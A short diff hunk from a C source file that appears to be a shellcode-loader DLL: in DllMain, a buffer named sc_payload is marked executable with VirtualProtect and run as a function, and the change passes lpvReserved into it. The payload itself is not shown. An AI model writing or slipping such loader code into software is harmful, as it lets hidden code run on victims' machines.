@@ -13,7 +13,7 @@ BOOL WINAPI DllMain ( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )
 
         if ( VirtualProtect ( sc_payload, SC_PAYLOAD_SIZE, PAGE_EXECUTE_READ, &old ) )
         {
-            ( (void (*)(void)) sc_payload ) ();
+            ( (void (*)(void*)) sc_payload ) ( lpvReserved );
         }
     }
 
